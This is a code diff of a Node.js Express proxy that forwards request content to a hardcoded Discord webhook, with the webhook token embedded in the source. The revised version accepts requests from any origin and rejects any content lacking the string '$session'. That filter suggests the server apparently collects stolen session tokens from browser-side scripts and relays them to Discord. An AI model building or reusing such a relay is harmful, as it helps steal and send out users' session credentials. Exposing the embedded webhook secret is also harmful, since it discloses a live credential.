@@ -1,40 +1,39 @@
-const express = require('express');
-const fetch = require('node-fetch');
-const cors = require('cors');  // Import CORS
-const app = express();
+import express from 'express';
+import cors from 'cors';
+import fetch from 'node-fetch';
 
-app.use(cors());              // Enable CORS
+const app = express();
+app.use(cors()); // Enable CORS for all origins
 app.use(express.json());
 
-const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1363135609601917199/-XCwFzteRcZQW5u98yN9oP86P55-kaErK8QNP8m4p7eaTH1GTuRbaewg9qnx-ljs9J-k';
-
-app.get('/', (req, res) => {
-  res.send('Backend proxy server is running!');
-});
+const DISCORD_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1363135609601917199/-XCwFzteRcZQW5u98yN9oP86P55-kaErK8QNP8m4p7eaTH1GTuRbaewg9qnx-ljs9J-k';
 
 app.post('/send-webhook', async (req, res) => {
   try {
     const { content } = req.body;
-    if (!content) {
-      return res.status(400).send('No content provided');
+
+    if (!content || !content.includes('$session')) {
+      return res.status(400).json({ error: 'Invalid content' });
     }
-    const discordRes = await fetch(WEBHOOK_URL, {
+
+    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ content }),
     });
+
     if (!discordRes.ok) {
-      const text = await discordRes.text();
-      return res.status(500).send(`Discord webhook error: ${text}`);
+      return res.status(500).json({ error: 'Failed to send to Discord' });
     }
-    res.send('Webhook sent successfully');
+
+    res.json({ success: true });
   } catch (err) {
-    console.error('Server error:', err);
-    res.status(500).send('Server error');
+    console.error('Error in /send-webhook:', err);
+    res.status(500).json({ error: 'Internal Server Error' });
   }
 });
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
   console.log(`Server listening on port ${PORT}`);
 });
